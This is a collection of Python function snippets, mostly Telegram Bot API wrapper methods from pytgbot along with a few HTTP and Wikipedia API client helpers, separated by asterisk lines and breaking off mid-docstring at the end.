def set_passport_data_errors(self, user_id, errors):
        """
        Informs a user that some of the Telegram Passport elements they provided contains errors. The user will not be able to re-submit their Passport to you until the errors are fixed (the contents of the field for which you returned the error must change). Returns True on success.
        Use this if the data submitted by the user doesn't satisfy the standards your service requires for any reason. For example, if a birthday date seems invalid, a submitted document is blurry, a scan shows evidence of tampering, etc. Supply some details in the error message to make sure the user knows how to correct the issues.

        https://core.telegram.org/bots/api#setpassportdataerrors


        Parameters:

        :param user_id: User identifier
        :type  user_id: int

        :param errors: A JSON-serialized array describing the errors
        :type  errors: list of pytgbot.api_types.sendable.passport.PassportElementError


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        from pytgbot.api_types.sendable.passport import PassportElementError

        assert_type_or_raise(user_id, int, parameter_name="user_id")

        assert_type_or_raise(errors, list, parameter_name="errors")

        result = self.do("setPassportDataErrors", user_id=user_id, errors=errors)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_passport_data_errors 
**************************************
def do(self, command, files=None, use_long_polling=False, request_timeout=None, **query):
        """
        Send a request to the api.

        If the bot is set to return the json objects, it will look like this:

        ```json
        {
            "ok": bool,
            "result": {...},
            # optionally present:
            "description": "human-readable description of the result",
            "error_code": int
        }
        ```

        :param command: The Url command parameter
        :type  command: str

        :param request_timeout: When the request should time out. Default: `None`
        :type  request_timeout: int

        :param files: if it needs to send files.

        :param use_long_polling: if it should use long polling. Default: `False`
                                (see http://docs.python-requests.org/en/latest/api/#requests.Response.iter_content)
        :type  use_long_polling: bool

        :param query: all the other `**kwargs` will get json encoded.

        :return: The json response from the server, or, if `self.return_python_objects` is `True`, a parsed return type.
        :rtype:  DictObject.DictObject | pytgbot.api_types.receivable.Receivable
        """
        import requests

        url, params = self._prepare_request(command, query)
        r = requests.post(url, params=params, files=files, stream=use_long_polling,
                          verify=True,  # No self signed certificates. Telegram should be trustworthy anyway...
                          timeout=request_timeout)
        return self._postprocess_request(r)
    # end def do 
**************************************
def delete_webhook(self, ):
        """
        Use this method to remove webhook integration if you decide to switch back to getUpdates. Returns True on success. Requires no parameters.

        https://core.telegram.org/bots/api#deletewebhook

        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        
        result = self.do("deleteWebhook", )
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_webhook 
**************************************
def get_webhook_info(self, ):
        """
        Use this method to get current webhook status. Requires no parameters. On success, returns a WebhookInfo object. If the bot is using getUpdates, will return an object with the url field empty.

        https://core.telegram.org/bots/api#getwebhookinfo

        
        Returns:

        :return: On success, returns a WebhookInfo object
        :rtype:  pytgbot.api_types.receivable.updates.WebhookInfo
        """
        
        result = self.do("getWebhookInfo", )
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import WebhookInfo
            try:
                return WebhookInfo.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type WebhookInfo", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_webhook_info 
**************************************
def unban_chat_member(self, chat_id, user_id):
        """
        Use this method to unban a previously kicked user in a supergroup or channel. The user will not return to the group or channel automatically, but will be able to join via link, etc. The bot must be an administrator for this to work. Returns True on success.

        https://core.telegram.org/bots/api#unbanchatmember

        
        Parameters:
        
        :param chat_id: Unique identifier for the target group or username of the target supergroup or channel (in the format @username)
        :type  chat_id: int | str|unicode
        
        :param user_id: Unique identifier of the target user
        :type  user_id: int
        
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(user_id, int, parameter_name="user_id")
        
        result = self.do("unbanChatMember", chat_id=chat_id, user_id=user_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def unban_chat_member 
**************************************
def set_chat_permissions(self, chat_id, permissions):
        """
        Use this method to set default chat permissions for all members. The bot must be an administrator in the group or a supergroup for this to work and must have the can_restrict_members admin rights. Returns True on success.

        https://core.telegram.org/bots/api#setchatpermissions

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target supergroup (in the format @supergroupusername)
        :type  chat_id: int | str|unicode
        
        :param permissions: New default chat permissions
        :type  permissions: pytgbot.api_types.receivable.peer.ChatPermissions
        
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        from pytgbot.api_types.receivable.peer import ChatPermissions
        
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        assert_type_or_raise(permissions, ChatPermissions, parameter_name="permissions")
        
        result = self.do("setChatPermissions", chat_id=chat_id, permissions=permissions)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_chat_permissions 
**************************************
def export_chat_invite_link(self, chat_id):
        """
        Use this method to generate a new invite link for a chat; any previously generated link is revoked. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns the new invite link as String on success.

        Note: Each administrator in a chat generates their own invite links. Bots can't use invite links generated by other administrators. If you want your bot to work with invite links, it will need to generate its own link using exportChatInviteLink – after this the link will become available to the bot via the getChat method. If your bot needs to generate a new invite link replacing its previous one, use exportChatInviteLink again.


        https://core.telegram.org/bots/api#exportchatinvitelink

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        
        Returns:

        :return: Returns the new invite link as String on success
        :rtype:  str|unicode
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        result = self.do("exportChatInviteLink", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(str, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive str", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def export_chat_invite_link 
**************************************
def delete_chat_photo(self, chat_id):
        """
        Use this method to delete a chat photo. Photos can't be changed for private chats. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns True on success.

        Note: In regular groups (non-supergroups), this method will only work if the ‘All Members Are Admins’ setting is off in the target group.


        https://core.telegram.org/bots/api#deletechatphoto

        
        Parameters:
        
        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode
        
        
        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")
        
        result = self.do("deleteChatPhoto", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_chat_photo 
**************************************
def __do_http_basic(self, method, uri,
                        value=None, headers=None, of=None,
                        handler=None, params=None):

        request_id, content, msg, err, status = None, None, None, None, None
        try:
            conn = httplib.HTTPConnection(self.endpoint, timeout=self.timeout)
            # conn.set_debuglevel(1)
            conn.request(method, uri, value, headers)
            resp = conn.getresponse()
            request_id = resp.getheader("X-Request-Id", "Unknown")

            status = resp.status
            if status / 100 == 2:
                if method == 'GET' and of:
                    readsofar = 0
                    totalsize = resp.getheader('content-length')
                    totalsize = totalsize and int(totalsize) or 0

                    hdr = None
                    if handler and totalsize > 0:
                        hdr = handler(totalsize, params)

                    while True:
                        chunk = resp.read(self.chunksize)
                        if chunk and hdr:
                            readsofar += len(chunk)
                            if readsofar != totalsize:
                                hdr.update(readsofar)
                            else:
                                hdr.finish()
                        if not chunk:
                            break
                        of.write(chunk)
                if method == 'GET' and of is None:
                    content = self.__decode_msg(resp.read())
                if method == 'PUT' or method == 'HEAD':
                    content = resp.getheaders()
            else:
                msg = resp.reason
                err = self.__decode_msg(resp.read())

        except (httplib.HTTPException, socket.error, socket.timeout) as e:
            raise UpYunClientException(str(e))
        except Exception as e:
            raise UpYunClientException(str(e))
        finally:
            if conn:
                conn.close()

        if msg:
            raise UpYunServiceException(request_id, status, msg, err)

        return content

    # http://docs.python-requests.org/ 
**************************************
def _get_data(self, url, config, send_sc=True):
        """ Hit a given URL and return the parsed json
        """
        # Load basic authentication configuration, if available.
        if config.username and config.password:
            auth = (config.username, config.password)
        else:
            auth = None

        # Load SSL configuration, if available.
        # ssl_verify can be a bool or a string (http://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification)
        if isinstance(config.ssl_verify, bool) or isinstance(config.ssl_verify, str):
            verify = config.ssl_verify
        else:
            verify = None
        if config.ssl_cert and config.ssl_key:
            cert = (config.ssl_cert, config.ssl_key)
        elif config.ssl_cert:
            cert = config.ssl_cert
        else:
            cert = None

        try:
            resp = requests.get(
                url,
                timeout=config.timeout,
                headers=headers(self.agentConfig),
                auth=auth,
                verify=verify,
                cert=cert
            )
            resp.raise_for_status()
        except Exception as e:
            if send_sc:
                self.service_check(
                    self.SERVICE_CHECK_CONNECT_NAME,
                    AgentCheck.CRITICAL,
                    message="Error {0} when hitting {1}".format(e, url),
                    tags=config.service_check_tags
                )
            raise

        return resp.json() 
**************************************
def extracts(
            self,
            page: 'WikipediaPage',
            **kwargs
    ) -> str:
        """
        Returns summary of the page with respect to parameters

        Parameter `exsectionformat` is taken from `Wikipedia` constructor.

        API Calls for parameters:

        - https://www.mediawiki.org/w/api.php?action=help&modules=query%2Bextracts
        - https://www.mediawiki.org/wiki/Extension:TextExtracts#API

        Example::

            import wikipediaapi
            wiki = wikipediaapi.Wikipedia('en')

            page = wiki.page('Python_(programming_language)')
            print(wiki.extracts(page, exsentences=1))
            print(wiki.extracts(page, exsentences=2))

        :param page: :class:`WikipediaPage`
        :param kwargs: parameters used in API call
        :return: summary of the page

        """
        params = {
            'action': 'query',
            'prop': 'extracts',
            'titles': page.title
        }  # type: Dict[str, Any]

        if self.extract_format == ExtractFormat.HTML:
            # we do nothing, when format is HTML
            pass
        elif self.extract_format == ExtractFormat.WIKI:
            params['explaintext'] = 1
            params['exsectionformat'] = 'wiki'
        # elif self.extract_format == ExtractFormat.PLAIN:
        #    params['explaintext'] = 1
        #    params['exsectionformat'] = 'plain'

        used_params = kwargs
        used_params.update(params)

        raw = self._query(
            page,
            used_params
        )
        self._common_attributes(raw['query'], page)
        pages = raw['query']['pages']
        for k, v in pages.items():
            if k == '-1':
                page._attributes['pageid'] = -1
                return ''
            else:
                return self._build_extracts(v, page)
        return '' 
**************************************
def langlinks(
            self,
            page: 'WikipediaPage',
            **kwargs
    ) -> PagesDict:
        """
        Returns langlinks of the page with respect to parameters

        API Calls for parameters:

        - https://www.mediawiki.org/w/api.php?action=help&modules=query%2Blanglinks
        - https://www.mediawiki.org/wiki/API:Langlinks

        :param page: :class:`WikipediaPage`
        :param kwargs: parameters used in API call
        :return: links to pages in other languages

        """

        params = {
            'action': 'query',
            'prop': 'langlinks',
            'titles': page.title,
            'lllimit': 500,
            'llprop': 'url',
        }

        used_params = kwargs
        used_params.update(params)

        raw = self._query(
            page,
            used_params
        )
        self._common_attributes(raw['query'], page)
        pages = raw['query']['pages']
        for k, v in pages.items():
            if k == '-1':
                page._attributes['pageid'] = -1
                return {}
            else:
                return self._build_langlinks(v, page)
        return {} 
**************************************
def links(
            self,
            page: 'WikipediaPage',
            **kwargs
    ) -> PagesDict:
        """
        Returns links to other pages with respect to parameters

        API Calls for parameters:

        - https://www.mediawiki.org/w/api.php?action=help&modules=query%2Blinks
        - https://www.mediawiki.org/wiki/API:Links

        :param page: :class:`WikipediaPage`
        :param kwargs: parameters used in API call
        :return: links to linked pages

        """

        params = {
            'action': 'query',
            'prop': 'links',
            'titles': page.title,
            'pllimit': 500,
        }

        used_params = kwargs
        used_params.update(params)

        raw = self._query(
            page,
            used_params
        )
        self._common_attributes(raw['query'], page)
        pages = raw['query']['pages']
        for k, v in pages.items():
            if k == '-1':
                page._attributes['pageid'] = -1
                return {}
            else:
                while 'continue' in raw:
                    params['plcontinue'] = raw['continue']['plcontinue']
                    raw = self._query(
                        page,
                        params
                    )
                    v['links'] += raw['query']['pages'][k]['links']

                return self._build_links(v, page)
        return {} 
**************************************
def categorymembers(
            self,
            page: 'WikipediaPage',
            **kwargs
    ) -> PagesDict:
        """
        Returns pages in given category with respect to parameters

        API Calls for parameters:

        - https://www.mediawiki.org/w/api.php?action=help&modules=query%2Bcategorymembers
        - https://www.mediawiki.org/wiki/API:Categorymembers

        :param page: :class:`WikipediaPage`
        :param kwargs: parameters used in API call
        :return: pages in given category
        """

        params = {
            'action': 'query',
            'list': 'categorymembers',
            'cmtitle': page.title,
            'cmlimit': 500,
        }

        used_params = kwargs
        used_params.update(params)

        raw = self._query(
            page,
            used_params
        )

        self._common_attributes(raw['query'], page)
        v = raw['query']
        while 'continue' in raw:
            params['cmcontinue'] = raw['continue']['cmcontinue']
            raw = self._query(
                page,
                params
            )
            v['categorymembers'] += raw['query']['categorymembers']

        return self._build_categorymembers(v, page) 
**************************************
def send(self, request: requests.Request, **kwargs) -> DetailedResponse:
        """Send a request and wrap the response in a DetailedResponse or APIException.

        Args:
            request: The request to send to the service endpoint.

        Raises:
            ApiException: The exception from the API.

        Returns:
            The response from the request.
        """
        # Use a one minute timeout when our caller doesn't give a timeout.
        # http://docs.python-requests.org/en/master/user/quickstart/#timeouts
        kwargs = dict({"timeout": 60}, **kwargs)
        kwargs = dict(kwargs, **self.http_config)

        if self.disable_ssl_verification:
            kwargs['verify'] = False

        try:
            response = requests.request(**request, cookies=self.jar, **kwargs)

            if 200 <= response.status_code <= 299:
                if response.status_code == 204 or request['method'] == 'HEAD':
                    # There is no body content for a HEAD request or a 204 response
                    result = None
                elif not response.text:
                    result = None
                else:
                    try:
                        result = response.json()
                    except:
                        result = response
                return DetailedResponse(result, response.headers,
                                        response.status_code)

            error_message = None
            if response.status_code == 401:
                error_message = 'Unauthorized: Access is denied due to ' \
                                'invalid credentials'
            raise ApiException(
                response.status_code, error_message, http_response=response)
        except requests.exceptions.SSLError:
            logging.exception(self.ERROR_MSG_DISABLE_SSL)
            raise
        except ApiException as err:
            logging.exception(err.message)
            raise
        except:
            logging.exception('Error in service call')
            raise 
**************************************
def do(self, command, files=None, use_long_polling=False, request_timeout=None, **query):
        """
        Send a request to the api.

        If the bot is set to return the json objects, it will look like this:

        ```json
        {
            "ok": bool,
            "result": {...},
            # optionally present:
            "description": "human-readable description of the result",
            "error_code": int
        }
        ```

        :param command: The Url command parameter
        :type  command: str

        :keyword request_timeout: When the request should time out.
        :type    request_timeout: int

        :keyword files: if it needs to send files.

        :keyword use_long_polling: if it should use long polling.
                                (see http://docs.python-requests.org/en/latest/api/#requests.Response.iter_content)
        :type    use_long_polling: bool

        :param query: will get json encoded.

        :return: The json response from the server, or, if `self.return_python_objects` is `True`, a parsed return type.
        :rtype: DictObject.DictObject | pytgbot.api_types.receivable.Receivable
        """
        params = self._prepare_request(command, query)
        r = self._do_request(
            params.url, params=params.params,
            files=files, stream=use_long_polling,  timeout=request_timeout
        )
        return self._process_response(r)






    # end def do 
**************************************
def forward_message(self, chat_id, from_chat_id, message_id, disable_notification=False):
        """
        Use this method to forward messages of any kind. On success, the sent Message is returned.

        https://core.telegram.org/bots/api#forwardmessage

        Parameters:

        :param chat_id: Unique identifier for the target chat (chat id of user chat or group chat) or username of the
                        target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode

        :param from_chat_id: Unique identifier for the chat where the original message was sent
                             (id for chats or the channel's username in the format @channelusername)
        :type  from_chat_id: int | str|unicode

        :param message_id: Message identifier in the chat specified in from_chat_id
        :type  message_id: int


        Optional keyword parameters:

        :param disable_notification: Sends the message silently. Users will receive a notification with no sound.
        :type  disable_notification: bool


        Returns:

        :return: On success, the sent Message is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(from_chat_id, (int, unicode_type), parameter_name="from_chat_id")

        assert_type_or_raise(message_id, int, parameter_name="message_id")

        assert_type_or_raise(disable_notification, None, bool, parameter_name="disable_notification")

        result = self.do(
            "forwardMessage", chat_id=chat_id, from_chat_id=from_chat_id, message_id=message_id,
            disable_notification=disable_notification
        )
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def forward_message 
**************************************
def stop_message_live_location(self, chat_id=None, message_id=None, inline_message_id=None, reply_markup=None):
        """
        Use this method to stop updating a live location message sent by the bot or via the bot (for inline bots) before live_period expires. On success, if the message was sent by the bot, the sent Message is returned, otherwise True is returned.

        https://core.telegram.org/bots/api#stopmessagelivelocation


        Optional keyword parameters:

        :param chat_id: Required if inline_message_id is not specified. Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode

        :param message_id: Required if inline_message_id is not specified. Identifier of the sent message
        :type  message_id: int

        :param inline_message_id: Required if chat_id and message_id are not specified. Identifier of the inline message
        :type  inline_message_id: str|unicode

        :param reply_markup: A JSON-serialized object for a new inline keyboard.
        :type  reply_markup: pytgbot.api_types.sendable.reply_markup.InlineKeyboardMarkup

        Returns:

        :return: On success, if the message was sent by the bot, the sent Message is returned, otherwise True is returned
        :rtype:  pytgbot.api_types.receivable.updates.Message | bool
        """
        from pytgbot.api_types.sendable.reply_markup import InlineKeyboardMarkup

        assert_type_or_raise(chat_id, None, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(message_id, None, int, parameter_name="message_id")

        assert_type_or_raise(inline_message_id, None, unicode_type, parameter_name="inline_message_id")

        assert_type_or_raise(reply_markup, None, InlineKeyboardMarkup, parameter_name="reply_markup")

        result = self.do("stopMessageLiveLocation", chat_id=chat_id, message_id=message_id, inline_message_id=inline_message_id, reply_markup=reply_markup)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import Message
            try:
                return Message.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Message", exc_info=True)
            # end try

            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def stop_message_live_location 
**************************************
def send_chat_action(self, chat_id, action):
        """
        Use this method when you need to tell the user that something is happening on the bot's side.
        The status is set for 5 seconds or less (when a message arrives from your bot,
        Telegram clients clear its typing status).

        Example: The ImageBot needs some time to process a request and upload the image.
                 Instead of sending a text message along the lines of "Retrieving image, please wait...",
                 the bot may use sendChatAction with action = "upload_photo".
                 The user will see a "sending photo" status for the bot.

        We only recommend using this method when a response from the bot will take a noticeable amount of time to arrive

        https://core.telegram.org/bots/api#sendchataction


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format
                         @channelusername)
        :type  chat_id: int | str|unicode

        :param action: Type of action to broadcast. Choose one, depending on what the user is about to receive:
                        "typing" for text messages, "upload_photo" for photos,
                        "record_video" or "upload_video" for videos, "record_audio" or "upload_audio" for audio files,
                        "upload_document" for general files, "find_location" for location data.
        :type  action: str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(action, unicode_type, parameter_name="action")

        result = self.do("sendChatAction", chat_id=chat_id, action=action)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def send_chat_action 
**************************************
def get_user_profile_photos(self, user_id, offset=None, limit=None):
        """
        Use this method to get a list of profile pictures for a user. Returns a UserProfilePhotos object.

        https://core.telegram.org/bots/api#getuserprofilephotos


        Parameters:

        :param user_id: Unique identifier of the target user
        :type  user_id: int


        Optional keyword parameters:

        :param offset: Sequential number of the first photo to be returned. By default, all photos are returned.
        :type  offset: int

        :param limit: Limits the number of photos to be retrieved. Values between 1—100 are accepted. Defaults to 100.
        :type  limit: int

        Returns:

        :return: Returns a UserProfilePhotos object
        :rtype:  pytgbot.api_types.receivable.media.UserProfilePhotos
        """
        assert_type_or_raise(user_id, int, parameter_name="user_id")

        assert_type_or_raise(offset, None, int, parameter_name="offset")

        assert_type_or_raise(limit, None, int, parameter_name="limit")

        result = self.do("getUserProfilePhotos", user_id=user_id, offset=offset, limit=limit)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.media import UserProfilePhotos
            try:
                return UserProfilePhotos.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type UserProfilePhotos", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_user_profile_photos 
**************************************
def get_file(self, file_id):
        """
        Use this method to get basic info about a file and prepare it for downloading.
        For the moment, bots can download files of up to 20MB in size.

        On success, a File object is returned.
        The file can then be downloaded via the link https://api.telegram.org/file/bot<token>/<file_path>,
        where <file_path> is taken from the response.
        It is guaranteed that the link will be valid for at least 1 hour.
        When the link expires, a new one can be requested by calling get_file again.

        Note: This function may not preserve the original file name and MIME type.
              You should save the file's MIME type and name (if available) when the File object is received.


        https://core.telegram.org/bots/api#getfile


        Parameters:

        :param file_id: File identifier to get info about
        :type  file_id: str|unicode


        Returns:

        :return: On success, a File object is returned
        :rtype:  pytgbot.api_types.receivable.media.File
        """
        assert_type_or_raise(file_id, unicode_type, parameter_name="file_id")

        result = self.do("getFile", file_id=file_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.media import File
            try:
                return File.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type File", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_file 
**************************************
def unban_chat_member(self, chat_id, user_id):
        """
        Use this method to unban a previously kicked user in a supergroup or channel.
        The user will not return to the group or channel automatically, but will be able to join via link, etc.

        The bot must be an administrator in the (super)group or channel for this to work. Returns True on success.

        https://core.telegram.org/bots/api#unbanchatmember


        Parameters:

        :param chat_id: Unique identifier for the target group or username of the target supergroup or channel (in the
                         format @username)
        :type  chat_id: int | str|unicode

        :param user_id: Unique identifier of the target user
        :type  user_id: int


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(user_id, int, parameter_name="user_id")

        result = self.do("unbanChatMember", chat_id=chat_id, user_id=user_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def unban_chat_member 
**************************************
def set_chat_photo(self, chat_id, photo):
        """
        Use this method to set a new profile photo for the chat. Photos can't be changed for private chats. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns True on success.

        Note: In regular groups (non-supergroups), this method will only work if the ‘All Members Are Admins’ setting is off in the target group.

        https://core.telegram.org/bots/api#setchatphoto


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode

        :param photo: New chat photo, uploaded using multipart/form-data
        :type  photo: pytgbot.api_types.sendable.files.InputFile


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        from pytgbot.api_types.sendable.files import InputFile

        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(photo, InputFile, parameter_name="photo")

        result = self._do_fileupload("photo", photo, _command="setChatPhoto", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_chat_photo 
**************************************
def pin_chat_message(self, chat_id, message_id, disable_notification=None):
        """
        Use this method to pin a message in a supergroup or a channel.
        The bot must be an administrator in the chat for this to work and must have the ‘can_pin_messages’ admin right
        in the supergroup or ‘can_edit_messages’ admin right in the channel. Returns True on success.


        https://core.telegram.org/bots/api#pinchatmessage


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup/cannel (in the format @username)
        :type  chat_id: int | str|unicode

        :param message_id: Identifier of a message to pin
        :type  message_id: int


        Optional keyword parameters:

        :param disable_notification: Pass True, if it is not necessary to send a notification to all chat members about the new pinned message. Notifications are always disabled in channels.
        :type  disable_notification: bool

        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(message_id, int, parameter_name="message_id")

        assert_type_or_raise(disable_notification, None, bool, parameter_name="disable_notification")

        result = self.do("pinChatMessage", chat_id=chat_id, message_id=message_id, disable_notification=disable_notification)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def pin_chat_message 
**************************************
def answer_callback_query(self, callback_query_id, text=None, show_alert=None, url=None, cache_time=None):
        """
        Use this method to send answers to callback queries sent from inline keyboards.
        The answer will be displayed to the user as a notification at the top of the chat screen or as an alert.
        On success, True is returned.

        Alternatively, the user can be redirected to the specified Game URL. For this option to work, you must first create a game for your bot via BotFather and accept the terms. Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter.

        https://core.telegram.org/bots/api#answercallbackquery


        Parameters:

        :param callback_query_id: Unique identifier for the query to be answered
        :type  callback_query_id: str|unicode


        Optional keyword parameters:

        :param text: Text of the notification. If not specified, nothing will be shown to the user, 0-200 characters
        :type  text: str|unicode

        :param show_alert: If true, an alert will be shown by the client instead of a notification at the top of the
                             chat screen. Defaults to false
        :type  show_alert: bool

        :param url: URL that will be opened by the user's client. If you have created a Game and accepted the conditions via @Botfather, specify the URL that opens your game – note that this will only work if the query comes from a callback_game button.Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter.
        :type  url: str|unicode

        :param cache_time: The maximum amount of time in seconds that the result of the callback query may be cached
                             client-side. Telegram apps will support caching starting in version 3.14. Defaults to 0
        :type  cache_time: int

        Returns:

        :return: On success, True is returned
        :rtype: bool
        """
        assert_type_or_raise(callback_query_id, unicode_type, parameter_name="callback_query_id")

        assert_type_or_raise(text, None, unicode_type, parameter_name="text")

        assert_type_or_raise(show_alert, None, bool, parameter_name="show_alert")

        assert_type_or_raise(url, None, unicode_type, parameter_name="url")

        assert_type_or_raise(cache_time, None, int, parameter_name="cache_time")

        result = self.do("answerCallbackQuery", callback_query_id=callback_query_id, text=text, show_alert=show_alert, url=url, cache_time=cache_time)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def answer_callback_query 
**************************************
def edit_message_reply_markup(self, chat_id=None, message_id=None, inline_message_id=None, reply_markup=None):
        """
        Use this method to edit only the reply markup of messages sent by the bot or via the bot (for inline bots).
